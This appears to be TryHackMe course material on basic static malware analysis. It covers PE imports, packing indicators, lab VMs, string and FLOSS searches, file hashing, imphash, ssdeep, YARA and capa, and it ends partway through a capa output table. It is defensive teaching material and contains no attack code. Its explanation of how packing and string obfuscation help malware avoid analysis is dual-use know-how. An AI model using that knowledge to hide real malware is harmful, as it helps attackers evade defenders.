- *SizeOfRawData:* This field represents the section size as stored on the disk before the PE file is loaded in memory.
- *Characteristics:* The characteristics field tells us
the permissions that the section has. For example, if the section has
READ permissions, WRITE permissions or EXECUTE permissions.

**IMAGE_IMPORT_DESCRIPTOR**

PE files don't contain all the code they need to perform their functions. In a Windows Operating System, PE
 files leverage code from the Windows API to perform many functions. The
 IMAGE_IMPORT_DESCRIPTOR structure contains information about the 
different Windows APIs that the PE file loads when executed. This information is handy in identifying the potential activity that a PE file might perform. For example, if a PE file imports CreateFile API, it indicates that it might create a file when executed.

This is what the IMAGE_IMPORT_DESCRIPTOR looks like in the pe-tree utility.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7ef95b3a891b858660b13c7fd416490a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7ef95b3a891b858660b13c7fd416490a.png)

Here
 we can see that the PE file we are looking at imports functions from 
ADVAPI32.dll, SHELL32.dll, ole32.dll, COMCTL32.dll, and USER32.dll. 
These files are dynamically linked libraries that export Windows 
functions or APIs for other PE files. The above screenshot shows that 
the PE file imports some functions that perform some registry actions. 
To find more information about what the function does, we can check out 
Microsoft Documentation. For example, [this link](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw) has details about the RegCreateKeyExW function.

In
 the above screenshot, we can see the values OriginalFirstThunk and 
FirstThunk. The Operating System uses these values to build the Import 
Address Table (IAT) of the PE file. We will learn more about these values in the coming rooms.

By studying the import functions of a PE file, we can identify some of the activities that the PE file might perform.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6e0d82a41dd713b7d0ee7156504b607f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6e0d82a41dd713b7d0ee7156504b607f.png)

Take the redline binary from the attached VM
 as an example. Its IMAGE_IMPORT_DESCRIPTOR imports notable functions 
such as CreateProcessW, CreateDirectoryW, and WriteFile from 
kernel32.dll. This implies that this PE
 file intends to create a process, create a directory, and write some 
data to a file. Similarly, by studying the rest of the imports, we can 
potentially identify other activities that a PE file intends to perform.

**Packing and Identifying packed executables**

Since
 a PE file's information can be easily extracted using a Hex editor or a
 tool like pe-tree, it becomes undesirable for people who don't want 
their code to be reverse-engineered. This is where the packers come in. A
 packer is a tool to obfuscate the data in a PE file so that it can't be
 read without unpacking it. In simple words, packers pack the PE file in
 a layer of obfuscation to avoid reverse engineering and render a PE 
file's static analysis useless. When the PE
 file is executed, it runs the unpacking routine to extract the original
 code and then executes it. Legitimate software developers use packing 
to address piracy concerns, and malware authors use it to avoid 
detection. So how do we identify packers?

### From Section Headers

In the previous tasks, we learned that commonly, a PE
 file has a .text section, a .data section, and a .rsrc section, where 
only the .text section has the execute flag set because it contains the 
code. Now take the example of the file named zmsuz3pinwl. When we open 
this file in pe-tree, we find that it has unconventional section names 
(or no names, in this case).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ae6603f0316ce4c6f7d7c4063f99cd09.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ae6603f0316ce4c6f7d7c4063f99cd09.png)

We might think this has something to do with the tool we use to analyze the file. Therefore, let's check it using another PE
 analysis tool called pecheck. The pecheck tool provides the same 
information we have been gathering from the pe-tree tool, but it is a 
command-line tool. We navigate to the Desktop\Samples directory in the 
terminal and give the following command to run the pecheck tool.

`pecheck zmsuz3pinwl`

Let's see the information in the PE Sections heading in the output:

PE Check utility

```
user@machine$ pecheck zmsuz3pinwlPE check for 'zmsuz3pinwl':
Entropy: 7.978052 (Min=0.0, Max=8.0)
MD5     hash: 1ebb1e268a462d56a389e8e1d06b4945
SHA-1   hash: 1ecc0b9f380896373e81ed166c34a89bded873b5
SHA-256 hash: 98c6cf0b129438ec62a628e8431e790b114ba0d82b76e625885ceedef286d6f5
SHA-512 hash: 6921532b4b5ed9514660eb408dfa5d28998f52aa206013546f9eb66e26861565f852ec7f04c85ae9be89e7721c4f1a5c31d2fae49b0e7fdfd20451191146614a
 entropy: 7.999788 (Min=0.0, Max=8.0)
 entropy: 7.961048 (Min=0.0, Max=8.0)
 entropy: 7.554513 (Min=0.0, Max=8.0)
.rsrc entropy: 6.938747 (Min=0.0, Max=8.0)
 entropy: 0.000000 (Min=0.0, Max=8.0)
.data entropy: 7.866646 (Min=0.0, Max=8.0)
.adata entropy: 0.000000 (Min=0.0, Max=8.0)
.
.
.
.
.
.
----------PE Sections----------

[IMAGE_SECTION_HEADER]
0x1F0      0x0   Name:
0x1F8      0x8   Misc:                          0x3F4000
0x1F8      0x8   Misc_PhysicalAddress:          0x3F4000
0x1F8      0x8   Misc_VirtualSize:              0x3F4000
0x1FC      0xC   VirtualAddress:                0x1000
0x200      0x10  SizeOfRawData:                 0xD3400
0x204      0x14  PointerToRawData:              0x400
0x208      0x18  PointerToRelocations:          0x0
0x20C      0x1C  PointerToLinenumbers:          0x0
0x210      0x20  NumberOfRelocations:           0x0
0x212      0x22  NumberOfLinenumbers:           0x0
0x214      0x24  Characteristics:               0xE0000040
Flags: IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE
Entropy: 7.999788 (Min=0.0, Max=8.0)
MD5     hash: fa9814d3aeb1fbfaa1557bac61136ba7
SHA-1   hash: 8db955c622c5bea3ec63bd917db9d41ce038c3f7
SHA-256 hash: 24f922c1cd45811eb5f3ab6f29872cda11db7d2251b7a3f44713627ad3659ac9
SHA-512 hash: e122e4600ea201058352c97bb7549163a0a5bcfb079630b197fe135ae732e64f5a6daff328f789e7b2285c5f975bce69414e55adba7d59006a1f0280bf64971c
.
.
.
.
.

```

We see here that the section name is empty, and it is not a glitch in the tool we used to analyze the PE file.

Another
 thing that we might notice here is that the Entropy of the .data 
section and three of the four unnamed sections is higher than seven and 
is approaching 8. As we discussed in a previous task, higher Entropy 
represents a higher level of randomness in data. Random data is 
generally generated when the original data is obfuscated, indicating 
that these values might indicate a packed executable.

Apart from the section names, another indicator of a packed executable is the permissions of each section. For the PE
 file in the above terminal, we can see that the section contains 
initialized data and has READ, WRITE and EXECUTE permissions. Similarly,
 some other sections also have READ, WRITE and EXECUTE permissions. This
 is also not found in the ordinary unpacked PE file, where only the .text section has EXECUTE permissions, as we saw in the redline malware sample.

Another valuable piece of information from the section headers to 
identify a packed executable is the SizeOfRawData and Misc_VirtualSize. 
In a packed executable, the SizeOfRawData will always be significantly 
smaller than the Misc_VirtualSize in sections with WRITE and EXECUTE 
permissions. This is because when the PE
 file unpacks during execution, it writes data to this section, 
increasing its size in the memory compared to the size on disk, and then
 executes it.

### From Import functions:

The last important indicator of a packed executable we discuss here is its import functions. The redline PE file we analyzed earlier imported lots of functions, indicating the activity it potentially performs. However, for the PE
 file zmsuz3pinwl, we will see only a handful of imports, especially the
 GetProcAddress, GetModuleHandleA, and LoadLibraryA. These functions are
 often some of the only few imports of a packed PE file because these functions provide the functionality to unpack the PE file during runtime.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8b7549ef9f8a18ea2fa1325a9f26da0f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8b7549ef9f8a18ea2fa1325a9f26da0f.png)

Summing up, the following indications point to a packed executable when we look at its PE header data:

- Unconventional section names
- EXECUTE permissions for multiple sections
- High Entropy, approaching 8, for some sections.
- A significant difference between SizeOfRawData and Misc_VirtualSize of some PE sections
- Very few import functions

## **BASIC STATIC ANALYSIS**

**Lab Setup**

## Basic precautions for malware analysis:

Before analyzing malware, one must understand that malware is often 
destructive. This means that when malware is being analyzed, there is a 
high chance of damaging the environment in which it is being analyzed. 
This damage can be permanent, and it might take more effort to get rid 
of this damage than the effort made to analyze the malware. Therefore, 
creating a lab setup that can withstand the destructive nature of 
malware is necessary.

## Virtual Machines:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/e5b7bcfda17fcd77c2f30d3fff71683e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/e5b7bcfda17fcd77c2f30d3fff71683e.png)

A lab setup for malware analysis requires the ability to save the 
state of a machine (snapshot) and revert to that state whenever 
required. The machine is thus prepared with all the required tools 
installed, and its state is saved. After analyzing the malware in that 
machine, it is restored to its clean state with all the tools installed.
 This activity ensures that each malware is analyzed in an otherwise 
clean environment, and after analysis, the machine can be reverted 
without any sustained damage.

Virtual
 Machines provide an ideal medium for malware analysis. Some famous 
software used for creating and using Virtual Machines includes [Oracle VirtualBox](https://www.virtualbox.org/) and [VMWare Workstation](https://www.vmware.com/products/workstation-pro.html).
 These applications can create snapshots and revert to them whenever 
required, making them well-suited for our malware analysis pursuit. In 
short, the following steps portray the usage of Virtual Machines for 
malware analysis.

1. Created a fresh Virtual Machine with a new OS install
2. Set up the machine by installing all the required analysis tools in it
3. Take a snapshot of the machine
4. Copy/Download malware samples inside the VM and analyze it
5. Revert the machine to the snapshot after the analysis completes

Following
 these steps ensures that your VM is not contaminated with remnants of 
previous malware samples when analyzing new malware. It also ensures 
that you don't have to install your tools again and again for each 
analysis. Selecting the tools to install in your malware analysis VM can
 also be hectic. One can use one of the freely available malware 
analysis VMs with pre-installed tools to ease this task. Let's review 
some common malware analysis VMs most popular among security 
researchers.

### FLARE VM:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c5c7241a9184faaabde284b87d473c77.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c5c7241a9184faaabde284b87d473c77.png)

The FLARE VM is a Windows-based VM well-suited for malware analysis 
created by Mandiant (Previously FireEye). It contains some of the 
community's favorite malware analysis tools. Furthermore, it is also 
customizable, i.e., you can install any of your own tools to the VM. 
FLARE VM is compatible with Windows 7 and Windows 10. For a list of 
tools already installed in the VM and installation steps, you can visit 
the [GitHub page](https://github.com/mandiant/flare-vm) or the [Mandiant blog](https://www.mandiant.com/resources/blog/flare-vm-update) for the VM. Since it is a Windows-based VM, it can perform dynamic analysis of Windows-based malware.

An instance of FLARE VM
 is attached to this room for performing practical tasks. Please click 
the Start Machine button on the top-right corner of this task to start 
the machine before proceeding to the next task. The attached VM has a directory named mal on the Desktop, which contains malware samples that we would be analyzing for this room.

### REMnux:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b28f543ea8d0643096516dbf5a63cced.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b28f543ea8d0643096516dbf5a63cced.png)

REMnux stands for Reverse Engineering Malware Linux. It
 is a Linux-based malware analysis distribution created by Lenny Zeltser
 in 2010. Later on, more people joined the team to improve upon the 
distribution. Like the FLARE VM, it includes some of the most popular 
reverse engineering and malware analysis tools pre-installed. It helps 
the analysts save time that would otherwise be spent in identifying, 
searching for, and installing the required tools. Details like 
installation and documentation can be found on [GitHub](https://github.com/REMnux) or the [website](https://remnux.org/) for distribution. Being a Linux-based
 distribution, it cannot be used to perform dynamic analysis of 
Windows-based malware. REMnux was previously used in the Intro to 
Malware Analysis room and will also be used in the upcoming rooms.

**String search**

In the [Intro to Malware Analysis](https://tryhackme.com/room/intromalwareanalysis)
 room, we identified that searching for strings is one of the first 
steps in malware analysis. A string search provides useful information 
to a malware analyst by identifying important pieces of strings present 
in a suspected malware sample. To learn a little more about strings, we 
can look at [this room](https://tryhackme.com/room/malstrings) dedicated to strings.

## How a string search works:

A string search looks at the binary data in a malware sample 
regardless of its file type and identifies sequences of ASCII or Unicode
 characters followed by a null character. Wherever it finds such a 
sequence, it reports that as a string. This might raise the question 
that not all sequences of binary data that looks like ASCII or Unicode 
characters will be actual strings, which is right. Many sequences of 
bytes can fulfill the criteria mentioned above but are not strings of 
useful value; rather, they might include memory addresses, assembly 
instructions, etc. Therefore, a string search leads to many False 
Positives (FPs). These FPs show up as garbage in the output of our 
string search and should be ignored. It is up to the analyst to identify
 the useful strings and ignore the rest.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0c44ff09fe1baba6fbb800b8e9066805.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0c44ff09fe1baba6fbb800b8e9066805.png)

## What to look for?

Since an analyst has to identify actual strings of interest and 
differentiate them from the garbage, it is good to know what to look for
 when performing a string search. Although a lot of useful information 
can be unearthed in a string search, the following artifacts can be used
 as Indicators of Compromise (IOCs) and prove more useful.

- Windows Functions and APIs, like SetWindowsHook, CreateProcess, InternetOpen,
etc. They provide information about the possible functionality of the
malware
- IP Addresses, URLs, or Domains can provide information
about possible C2 communication. The Wannacry malware's killswitch
domain was found using a string search
- Miscellaneous strings
such as Bitcoin addresses, text used for Message Boxes, etc. This
information helps set the context for further malware analysis

## Basic String Search:

In the [Intro to Malware Analysis](https://tryhackme.com/room/intromalwareanalysis) room, we learned about the `strings` utility, which is pre-installed in Linux machines and can be used for a basic string search. Similarly, the FLARE VM comes with a Windows utility, `strings.exe`,
 that performs the same task. This Windows strings utility is part of 
the Sysinternals suite, a set of tools published by Microsoft to analyze
 different aspects of a Windows machine. Details about the strings 
utility can be found in [Microsoft Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/strings). The strings utility comes pre-installed in the FLARE VM
 attached to this room. The good thing about the command line strings 
utility is that it can dump strings to a file for further analysis. In 
the attached VM, executing the following command will perform a basic string search in a binary.

`C:\Users\Administrator\Desktop>strings <path to binary>`

Several other tools included in the FLARE VM
 can be used for string search. For example, CyberChef 
(Desktop>FLARE>Utilities>Cyberchef) has a recipe for basic 
string search as well. PEstudio 
(Desktop>FLARE>Utilities>pestudio) also provides a string 
search utility. PEstudio also provides some additional information about
 the strings, like, the encoding, size of the string, offset in the 
binary where the string was found, and a hint to guess what the string 
is related to. It also has a column for a blacklist, which matches the 
strings against some signatures.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/515900e121ff6b875d52b20fbe12c573.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/515900e121ff6b875d52b20fbe12c573.png)

The above screenshot from 
PEstudio shows strings found by PEstudio in a malware sample. This can 
be done by selecting strings in the left pane after loading the PE file in PEstudio. The blacklist here shows a bunch of Windows API calls, which PEstudio flags as potentially used in malicious processes. You can learn about these APIs using resources like [MalAPI](https://malapi.io/) or [MSDN](https://docs.microsoft.com/en-us/search/?scope=Desktop&terms=queryperformancecounter).

## Obfuscated strings:

Searching for strings often proves one of the most effective first steps in malware analysis. As seen in [the case of Wannacry](https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/),
 effective use of string search can often disrupt malware propagation 
and infection. The malware authors know this and don't want a simple 
string search to thwart their malicious activities. Therefore, they 
deploy techniques to obfuscate strings in their malware. Malware authors
 use several techniques to obfuscate the key parts of their code. These 
techniques often render a string search ineffective, i.e., we won't find
 much information when we search for strings.

Mandiant (then FireEye) launched FLOSS to solve this problem, short for **F**ireEye **L**abs **O**bfuscated **S**tring **S**olver.
 FLOSS uses several techniques to deobfuscate and extract strings that 
would not be otherwise found using a string search. The type of strings 
that FLOSS can extract and how it works can be found in [Mandiant's blog post](https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings).

To execute FLOSS, open a command prompt and navigate to the Desktop directory. From there, use the following command.

`C:\Users\Administrator\Desktop>floss -h`

This command will open the help page for FLOSS. We can use the 
following command to use FLOSS to search for obfuscated strings in a 
binary.

`C:\Users\Administrator\Desktop>floss --no-static-strings <path to binary>`

Please remember that the command might take some time to execute, and
 you might see what appear to be some error messages before the results 
are generated.

**Fingerprinting malware**

When
 analyzing malware, it is often required to identify unique malware and 
differentiate them from each other. File names can't be used for this 
purpose as they can be duplicated easily and might be confusing. Also, a
 file name can be changed easily as well.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/41c2130d2febd90806b5454599d0f9c3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/41c2130d2febd90806b5454599d0f9c3.png)

Hence,
 a hash function is used to identify a malware sample uniquely. A hash 
function takes a file/data of arbitrary length as input and creates a 
fixed-length unique output based on file contents. This process is 
irreversible, as you can't recreate the file's contents using the hash. 
Hash functions have a very low probability (practically zero) of two 
files having different content but the same hash. A hash remains the 
same as long as the file's content remains the same. However, even a 
slight change in content will result in a different hash. It might be 
noted that the file name is not a part of the content; therefore, 
changing the file name does not affect the hash of a file.

Besides
 identifying files, hashes are also used to store passwords to 
authenticate users. In malware analysis, hash files can be used to 
identify unique malware, search for this malware in different malware 
repositories and databases, and as an Indicator of Compromise (IOC).

## Commonly used methods of calculating File hashes:

For identification of files, a hash of the complete file is taken. 
There are various methods to take the hash. The most commonly used 
methods are:

- Md5sum
- Sha1sum
- Sha256sum

The
 first two types of hashes are now considered insecure or prone to 
collision attacks (when two or more inputs result in the same hash). 
Although a collision attack for these hash functions is not very 
probable, it is still possible. Therefore, sha256sum is currently 
considered the most secure method of calculating a file hash. In the 
attached VM, we can see that multiple utilities calculate file hashes for us.

## Finding Similar files using hashes:

Another scenario in which hash functions help a malware analyst is 
identifying similar files using hashes. We already established that even
 a slight change in the contents of a file would result in a different 
hash. However, some types of hashes can help identify the similarity 
among different files. Let's learn about some of these.

### Imphash:

The imphash stands for "import hash". Imports are functions that an 
executable file imports from other files or Dynamically Linked Libraries
 (DLLs). The imphash is a hash of the function calls/libraries that a 
malware sample imports and the order in which these libraries are 
present in the sample. This helps identify samples from the same threat 
groups or performing similar activities. More details on the Imphash can
 be found on Mandiant's blog [here](https://www.mandiant.com/resources/blog/tracking-malware-import-hashing).

We can use PEstudio to calculate the Imphash of a sample.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a6b2943792824c6d9f4af73930aaf927.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a6b2943792824c6d9f4af73930aaf927.png)

Any malware samples with the same imports in the same order will have
 the same imphash. This helps in identifying similar samples.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bd5faa050d85c40c8b79bbb4581ce2eb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bd5faa050d85c40c8b79bbb4581ce2eb.png)

In the above screenshot from [Malware Bazaar](https://bazaar.abuse.ch/browse.php?search=imphash%3A756fdea446bc618b4804509775306c0d),
 all these samples have the same imphash. We can see that all of these 
samples are classified as the same malware family. We can see that their
 sha256 hash is vastly different and doesn't provide any information as 
to their similarity. However, the same imphash helps us identify that 
they might belong to the same family.

### Fuzzy hashes/SSDEEP:

Another way to identify similar malware is through fuzzy hashes. A 
fuzzy hash is a Context Triggered Piecewise Hash (CTPH). This hash is 
calculated by dividing a file into pieces and calculating the hashes of 
the different pieces. This method creates multiple inputs with similar 
sequences of bytes, even though the whole file might be different. More 
information on SSDEEP can be found on this [link](https://ssdeep-project.github.io/ssdeep/index.html).

Multiple utilities can be used in the attached VM
 to calculate ssdeep, like CyberChef. However, the ssdeep utility has 
been placed on the Desktop to make it easier. The following command 
shows the help menu of the utility.

Finding similar files using ssdeep

```
C:\Users\Administrator\Desktop>ssdeep-2.14.1\ssdeep.exe -h
ssdeep version 2.14.1 by Jesse Kornblum and the ssdeep Project
For copyright information, see man page or README.TXT.

Usage: ssdeep [-m file] [-k file] [-dpgvrsblcxa] [-t val] [-h|-V] [FILES]
-m - Match FILES against known hashes in file
-k - Match signatures in FILES against signatures in file
-d - Directory mode, compare all files in a directory
-p - Pretty matching mode. Similar to -d but includes all matches
-g - Cluster matches together
-v - Verbose mode. Displays filename as its being processed
-r - Recursive mode
-s - Silent mode; all errors are suppressed
-b - Uses only the bare name of files; all path information omitted
-l - Uses relative paths for filenames
-c - Prints output in CSV format
-x - Compare FILES as signature files
-a - Display all matches, regardless of score
-t - Only displays matches above the given threshold
-h - Display this help message
-V - Display version number and exit

FLARE Sun 09/18/2022 17:28:35.11
C:\Users\Administrator\Desktop>
```

Let's calculate the hashes of all the samples in the mal directory in the attached VM.

Calculating ssdeep

```
C:\Users\Administrator\Desktop>ssdeep-2.14.1\ssdeep.exe mal\*
ssdeep,1.1--blocksize:hash:hash,filename
3072:C3twbyJdvGwRCf/swDQheOAmN4hMRl37G:8EacOAmN6C,"C:\Users\Administrator\Desktop\mal\1"
768:fMjB/JpMfHDWqpuXDvod3UmQmv4acY2GS2C9xjwhU:UFQlpSDvoJrbvUfGS2q,"C:\Users\Administrator\Desktop\mal\2"
1536:C3tvICAqw8IKVn2wJk0c8PoYJvGwRCwAL6pILgl7vBIQtCnDkbZ3eOAmV2u4hnnM:C3twbyJdvGwRCf/swDQheOAmN4hM,"C:\Users\Administrator\Desktop\mal\3"
24576:u7DtlSDAlZvEFZhbS7buPPcedeHP5XLnkO3hGL8Siw9zVZprY8fWg5r11O:8OKVizL3cvtkO3hmVVZBYu5r1M,"C:\Users\Administrator\Desktop\mal\4"
12288:z+IIs67xrXWxgxMdplNGvIcGZwwDVHJXuDzKYzIE5P/XiS6lYSz8uahDtbNL6WTW:z+PsGlsFGgcQDJJQ,"C:\Users\Administrator\Desktop\mal\5"
24576:UCsTPcqE9S7tdODN+6ybJVCy2pvZHGOzPBjRj4AFsb:UCO7tsp+6ybJVChpRjvs,"C:\Users\Administrator\Desktop\mal\6"

FLARE Sun 09/18/2022 17:41:12.38
C:\Users\Administrator\Desktop>
```

We can try the other options shown in the help file per the 
requirement. When we have the ssdeep hashes, we can match these hashes 
together to identify similar files. This helps us identify similar files
 if we have a bulk of data. The documentation link provided above has 
very good examples of usage. The following terminal window shows one of 
the examples relevant to our use case to match files. For this, we can 
use the `-d` operator. The `-r` operator runs the ssdeep utility recursively, and the `-l` operator outputs relative paths of the files.

Finding matching files using ssdeep

```
C:\Users\Administrator\Desktop>ssdeep-2.14.1\ssdeep -l -r -d Incoming Outgoing Trash
Outgoing/Corporate Espionage/Our Budget.doc matches Incoming/Budget 2007.doc (99)
Outgoing/Personnel Mayhem/Your Buddy Makes More Than You.doc matches Incoming/Salaries.doc (45)
Trash/DO NOT DISTRIBUTE.doc matches Outgoing/Plan for Hostile Takeover.doc (88)

FLARE Sun 09/18/2022 17:41:12.38
C:\Users\Administrator\Desktop>
```

The results show files that match each other. The number in the 
bracket at the end is the percentage of matches among the files.

**Signature-based detection**

In
 the previous task, we learned how hashes could identify identical 
files. We also found out that hashes can be changed by changing even a 
single byte of data in a file and how specific hashes like imphash and 
ssdeep help us identify file similarities. While using imphash or ssdeep
 provides a way to identify if some files are similar, sometimes we just
 need to identify if a file contains the information of interest. Hashes
 are not the ideal tool to perform this task.

## Signatures:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/88c03f455d1eca955675e40b33cfcd39.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/88c03f455d1eca955675e40b33cfcd39.png)

Signatures are a way to identify if a particular file has a 
particular type of content. We can consider a signature as a pattern 
that might be found inside a file. This pattern is often a sequence of 
bytes in a file, with or without any context regarding where it is 
found. Security researchers often use signatures to identify patterns in
 a file, identify if a file is malicious, and identify suspected 
behavior and malware family.

### Yara rules:

Yara rules are a type of signature-based rule. It is famously called a
 pattern-matching swiss army knife for malware researchers. Yara
 can identify information based on binary and textual patterns, such as 
hexadecimal and strings contained within a file. TryHackMe has a [dedicated room](https://tryhackme.com/room/yara) for Yara rules if it interests you.

The security community publishes a [repository](https://github.com/Yara-Rules/rules)
 of open-source Yara rules that we can use as per our needs. When 
analyzing malware, we can use this repository to dig into the 
community's collective wisdom. However, while using these rules, please 
keep in mind that some might depend on context. Some others might just 
be used for the identification of patterns that can be non-malicious as 
well. Hence, just because a rule hits doesn't mean the file is 
malicious. For a better understanding, please read the documentation for
 the particular rule to identify the use case where it will be 
applicable in the best possible manner.

### Proprietary Signatures - AntiVirus Scans:

Besides the open-source signatures, Antivirus companies spend lots of
 resources to create proprietary signatures. The advantage of these 
proprietary signatures is that since they have to be sold commercially, 
there are lesser chances of False Positives (FPs, when a signature hits a
 non-malicious file). However, this might lead to a few False Negatives 
(FNs, when a malicious file does not hit any signature).

Antivirus
 scanning helps identify if a file is malicious with high confidence. 
Antivirus software will often mention the signature that the file has 
hit, which might hint at the file's functionality. However, we must note
 that despite their best efforts, every AV product in the market has 
some FPs and some FNs. Therefore, when analyzing malware, it is prudent 
to get a verdict from multiple products. The [Virustotal](https://www.virustotal.com/gui/home/upload) website makes this task easier for us, where we can find the verdict about a file from 60+ AV
 vendors, apart from some very useful information. We also touched upon 
this topic in our Intro to Malware Analysis room. Please remember, if 
you are analyzing a sensitive file, it is best practice to search for 
its hash on Virustotal or other scanning websites instead of uploading 
the file itself. This is done to avoid leaking sensitive information on 
the internet and letting a sophisticated attacker know that you are 
analyzing their malware.

Since we have covered Yara rules in 
detail in the Yara room and Virustotal scanning in the Intro to malware 
analysis room, we will not cover them again here. However, the FLARE VM has another very cool tool that can be used for signature scanning.

### Capa:

Capa is another open-source tool created by Mandiant. This tool helps
 identify the capabilities found in a PE file. Capa reads the files and 
tries to identify the behavior of the file based on signatures such as 
imports, strings, mutexes, and other artifacts present in the file. For 
further detail into the background of Capa, we can visit its [Github page](https://github.com/mandiant/capa) or Mandiant's [blog post](https://www.mandiant.com/resources/blog/capa-automatically-identify-malware-capabilities) introducing Capa.

Using Capa is simple. On the command prompt, we just point capa to the file we want to run it against.

`C:\Users\Administrator\Desktop>capa mal.exe`

The `-h` operator shows detailed options.

Capa

```
C:\Users\Administrator\Desktop>capa -h
usage: capa.exe [-h] [--version] [-v] [-vv] [-d] [-q] [--color {auto,always,never}] [-f {auto,pe,sc32,sc64,freeze}] [-b {vivisect,smda}] [-r RULES] [-t TAG] [-j] sample

The FLARE team's open-source tool to identify capabilities in executable files.

positional arguments:
  sample                path to sample to analyze

optional arguments:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -v, --verbose         enable verbose result document (no effect with --json)
  -vv, --vverbose       enable very verbose result document (no effect with --json)
  -d, --debug           enable debugging output on STDERR
  -q, --quiet           disable all output but errors
  --color {auto,always,never}
                        enable ANSI color codes in results, default: only during interactive session
  -f {auto,pe,sc32,sc64,freeze}, --format {auto,pe,sc32,sc64,freeze}
                        select sample format, auto: (default) detect file type automatically, pe: Windows PE file, sc32: 32-bit shellcode, sc64: 64-bit shellcode, freeze: features
                        previously frozen by capa
  -b {vivisect,smda}, --backend {vivisect,smda}
                        select the backend to use
  -r RULES, --rules RULES
                        path to rule file or directory, use embedded rules by default
  -t TAG, --tag TAG     filter on rule meta field values
  -j, --json            emit JSON instead of text

By default, capa uses a default set of embedded rules.
You can see the rule set here:
  https://github.com/fireeye/capa-rules

To provide your own rule set, use the `-r` flag:
  capa  --rules /path/to/rules  suspicious.exe
  capa  -r      /path/to/rules  suspicious.exe

examples:
  identify capabilities in a binary
    capa suspicious.exe

  identify capabilities in 32-bit shellcode, see `-f` for all supported formats
    capa -f sc32 shellcode.bin

  report match locations
    capa -v suspicious.exe

  report all feature match details
    capa -vv suspicious.exe

  filter rules by meta fields, e.g. rule name or namespace
    capa -t "create TCP socket" suspicious.exe

FLARE Sun 09/18/2022 18:10:17.58
C:\Users\Administrator\Desktop>
```

We can test drive capa by running it against the binaries in the 
Desktop\mal directory. Please note that capa might take some time to 
complete the analysis. An example output is below.

Capa example

```
C:\Users\Administrator\Desktop>capa mal\1
loading : 100%|████████████████████████████████████████████████████████████| 485/485 [00:00<00:00, 1552.05     rules/s]
matching: 100%|██████████████████████████████████████████████████████████████| 288/288 [00:12<00:00, 22.23 functions/s]
+------------------------+------------------------------------------------------------------------------------+
| md5                    | 6548eec09f4d8bc6514bee3e5452541c                                                   |
| sha1                   | 7be46c62d975949fdd6777530940cf6435e8cb90                                           |
| sha256                 | 6ec74cc0a9b5697efd3f4cc4d3a21d9ffe6e0187b770990df8743fbf4f3b2518                   |
| path                   | mal\1                                                                              |
+------------------------+------------------------------------------------------------------------------------+

+------------------------+------------------------------------------------------------------------------------+
| ATT&CK Tactic          | ATT&CK Technique                                                                   |
|------------------------+------------------------------------------------------------------------------------|
| DEFENSE EVASION        | Obfuscated Files or Information::Indicator Removal from Tools [T1027.005]          |
|                        | Obfuscated Files or Information [T1027]                                            |
| DISCOVERY              | Application Window Discovery [T1010]                                               |
|                        | System Information Discovery [T1082]                                               |
| EXECUTION              | Command and Scripting Interpreter [T1059]                                          |
|                        | Shared Modules [T1129]                                                             |
+------------------------+------------------------------------------------------------------------------------+

+-----------------------------+-------------------------------------------------------------------------------+
| MBC Objective               | MBC Behavior                                                                  |
|-----------------------------+-------------------------------------------------------------------------------|
| ANTI-STATIC ANALYSIS        | Disassembler Evasion::Argument Obfuscation [B0012.001]                        |
| CRYPTOGRAPHY                | Encrypt Data::RC4 [C0027.009]                                                 |
|                             | Generate Pseudo-random Sequence::RC4 PRGA [C0021.004]                         |
| FILE SYSTEM                 | Delete File [C0047]                                                           |
|                             | Read File [C0051]                                                             |
|                             | Write File [C0052]                                                            |
| OPERATING SYSTEM            | Console [C0033]                                                               |
| PROCESS                     | Allocate Thread Local Storage [C0040]                                         |
|                             | Set Thread Local Storage Value [C0041]                                        |
|                             | Terminate Process [C0018]                                                     |
